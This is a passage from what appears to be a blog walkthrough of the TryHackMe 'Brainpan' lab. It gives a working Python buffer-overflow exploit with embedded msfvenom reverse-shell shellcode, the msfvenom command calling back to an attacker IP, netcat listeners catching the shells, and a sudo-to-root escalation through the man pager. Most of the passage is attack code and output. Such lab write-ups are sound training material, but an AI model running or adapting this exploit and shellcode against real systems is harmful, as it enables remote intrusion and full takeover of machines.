payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">bf"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">6e"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">02"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">7b"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">93"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">1a"</span>
</code></pre></div></div> <p><br> Update the code with the payload that was just generated. Also use a nopsled to lead into the payload.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1">#baddies = \x00
</span>
<span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xda\xcf\xbb\xb2\x1e\xd7\x41\xd9\x74\x24\xf4</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5f\x31\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x83\x75\x1a\x35\xb4\x85\xcb\x3b\x37\x75\x0c</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5c\xb1\x90\x3d\x5c\xa5\xd1\x6e\x6c\xad\xb7</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x82\x07\xe3\x23\x10\x65\x2c\x44\x91\xc0\x0a</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6b\x22\x78\x6e\xea\xa0\x83\xa3\xcc\x99\x4b</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb6\x0d\xdd\xb6\x3b\x5f\xb6\xbd\xee\x4f\xb3</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x88\x32\xe4\x8f\x1d\x33\x19\x47\x1f\x12\x8c</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\x46\xb4\x2f\x37\xf3\xfd\x37\x54\x3e\xb7</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xcc\xae\xb4\x46\x04\xff\x35\xe4\x69\xcf\xc7</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf4\xae\xe8\x37\x83\xc6\x0a\xc5\x94\x1d\x70</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x11\x10\x85\xd2\xd2\x82\x61\xe2\x37\x54\xe2</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe8\xfc\x12\xac\xec\x03\xf6\xc7\x09\x8f\xf9</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x07\x98\xcb\xdd\x83\xc0\x88\x7c\x92\xac\x7f</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x80\xc4\x0e\xdf\x24\x8f\xa3\x34\x55\xd2\xab</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf9\x54\xec\x2b\x96\xef\x9f\x19\x39\x44\x37</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x12\xb2\x42\xc0\x55\xe9\x33\x5e\xa8\x12\x44</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x77\x6f\x46\x14\xef\x46\xe7\xff\xef\x67\x32</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xaf\xbf\xc7\xed\x10\x6f\xa8\x5d\xf9\x65\x27</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x81\x19\x86\xed\xaa\xb0\x7d\x66\xdf\x44\x7d</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x7a\xb7\x46\x7d\x83\xfc\xce\x9b\xe9\x12\x87</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x34\x86\x8b\x82\xce\x37\x53\x19\xab\x78\xdf</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xae\x4c\x36\x28\xda\x5e\xaf\xd8\x91\x3c\x66</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe6\x0f\x28\xe4\x75\xd4\xa8\x63\x66\x43\xff</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x24\x58\x9a\x95\xd8\xc3\x34\x8b\x20\x95\x7f</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x0f\xff\x66\x81\x8e\x72\xd2\xa5\x80\x4a\xdb</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe1\xf4\x02\x8a\xbf\xa2\xe4\x64\x0e\x1c\xbf</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xdb\xd8\xc8\x46\x10\xdb\x8e\x46\x7d\xad\x6e</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf6\x28\xe8\x91\x37\xbd\xfc\xea\x25\x5d\x02</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x21\xee\x7d\xe1\xe3\x1b\x16\xbc\x66\xa6\x7b</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3f\x5d\xe5\x85\xbc\x57\x96\x71\xdc\x12\x93</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3e\x5a\xcf\xe9\x2f\x0f\xef\x5e\x4f\x1a</span><span class="sh">"</span>

<span class="n">inputBuffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">524</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;L</span><span class="sh">'</span><span class="p">,(</span><span class="mh">0x311712f3</span><span class="p">))</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">payload</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1100</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x09.py </div> <p><br> Start a netcat listener that listens on port 443.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443   
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>sec: 
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div> <p><br> Run the code and check the listener to see the shell.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(sec㉿kali)-[~/Documents/thm/brainpan]
└─$ sudo nc -nlvp 443   
[sudo] password for sec: 
listening on [any] 443 ...
connect to [10.0.0.12] from (UNKNOWN) [10.0.0.11] 49682

Microsoft Windows [Version 10.0.19045.5247]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Windows Kits\10\Debuggers&gt;whoami
whoami
desktop-8pbgp5f\win
</code></pre></div></div> <p><br> Double-check the nmap notice that operating system is likely to be linux.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.157.16
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-03 13:33 AEDT

&lt;snip&gt;

Aggressive OS guesses: Linux 3.1 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>95%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>95%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>93%<span class="o">)</span>, Android 4.1.1 <span class="o">(</span>93%<span class="o">)</span>, Android 5.0 - 6.0.1 <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.0 - 3.2 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.0 - 3.5 <span class="o">(</span>93%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Network Distance: 4 hops

&lt;snip&gt;

</code></pre></div></div> <p><br> Generate a new msfvenom payload for Linux.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.4.118.138 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nv">ExitFunc</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> python <span class="nt">-v</span> payload
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 530 bytes
payload <span class="o">=</span>  b<span class="s2">""</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">17"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">40"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">dc"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">36"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">aa"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">b5</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">c3"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">35"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">ac"</span>
</code></pre></div></div> <p><br> Update the code with the new payload and update the IP address to point to the THM IP.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.10.47.78</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1">#baddies = \x00
</span>
<span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xdb\xde\xbb\xd7\x23\x22\xf1\xd9\x74\x24\xf4</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5a\x33\xc9\xb1\x12\x31\x5a\x17\x03\x5a\x17</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x83\x15\x27\xc0\x04\xa8\xf3\xf3\x04\x99\x40</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xaf\xa0\x1f\xce\xae\x85\x79\x1d\xb0\x75\xdc</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x2d\x8e\xb4\x5e\x04\x88\xbf\x36\x9d\x6e\x36</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4c\xc9\x6c\xb6\x51\xb1\xf8\x57\xe1\xa3\xaa</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc6\x52\x9f\x48\x60\xb5\x12\xce\x20\x5d\xc3</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe0\xb7\xf5\x73\xd0\x18\x67\xed\xa7\x84\x35</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xbe\x3e\xab\x09\x4b\x8c\xac</span><span class="sh">"</span>

<span class="n">inputBuffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">524</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;L</span><span class="sh">'</span><span class="p">,(</span><span class="mh">0x311712f3</span><span class="p">))</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">payload</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1100</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x0a.py </div> <p><br> Kill the other listener if it is still running with ctrl + c. Start a new listener on port 443.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div> <p><br> Run the code, check the listener, and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.4.118.138] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.249.157] 54657
<span class="nb">whoami
</span>puck
</code></pre></div></div> <p><br> Upgrade the shell by spawning another shell with python.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
puck@brainpan:/home/puck<span class="err">$</span>
</code></pre></div></div> <p><br> Run sudo -l to see a list of all of the command the user is permitted to use as root.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>puck on this host:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User puck may run the following commands on this host:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/anansi/bin/anansi_util
</code></pre></div></div> <p><br> Run the anansi_util program that was discovered.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util    
<span class="nb">sudo</span> /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util <span class="o">[</span>action]
Where <span class="o">[</span>action] is one of:
  - network
  - proclist
  - manual <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
</code></pre></div></div> <p><br> Run the anansi_util with the manual option to see what it does.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util manual <span class="nb">ls
sudo</span> /home/anansi/bin/anansi_util manual <span class="nb">ls
</span>No manual entry <span class="k">for </span>manual
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)</span>
LS<span class="o">(</span>1<span class="o">)</span>                            User Commands                           LS<span class="o">(</span>1<span class="o">)</span>

NAME
       <span class="nb">ls</span> - list directory contents

SYNOPSIS
       <span class="nb">ls</span> <span class="o">[</span>OPTION]... <span class="o">[</span>FILE]...

DESCRIPTION
       List  information  about  the FILEs <span class="o">(</span>the current directory by default<span class="o">)</span><span class="nb">.</span>
       Sort entries alphabetically <span class="k">if </span>none of <span class="nt">-cftuvSUX</span> nor <span class="nt">--sort</span>  is  speci‐
       fied.

       Mandatory  arguments  to  long  options are mandatory <span class="k">for </span>short options
       too.

       <span class="nt">-a</span>, <span class="nt">--all</span>
              <span class="k">do </span>not ignore entries starting with <span class="nb">.</span>

       <span class="nt">-A</span>, <span class="nt">--almost-all</span>
              <span class="k">do </span>not list implied <span class="nb">.</span> and ..

       <span class="nt">--author</span>
 Manual page <span class="nb">ls</span><span class="o">(</span>1<span class="o">)</span> line 1 <span class="o">(</span>press h <span class="k">for </span><span class="nb">help </span>or q to quit<span class="o">)</span>q
</code></pre></div></div> <p><br> Now, that it is known that it calls the man command, lookup man on the gtfobins.</p> <p><a href="https://gtfobins.github.io/gtfobins/man/#sudo" rel="external nofollow noopener" target="_blank">GTFObins</a></p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/gtfobins.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="The Results From GTFObins" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use the command again with sudo to drop into the manual. Then, use !/bin/sh to drop into a root shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util manual man
<span class="nb">sudo</span> /home/anansi/bin/anansi_util manual man
No manual entry <span class="k">for </span>manual
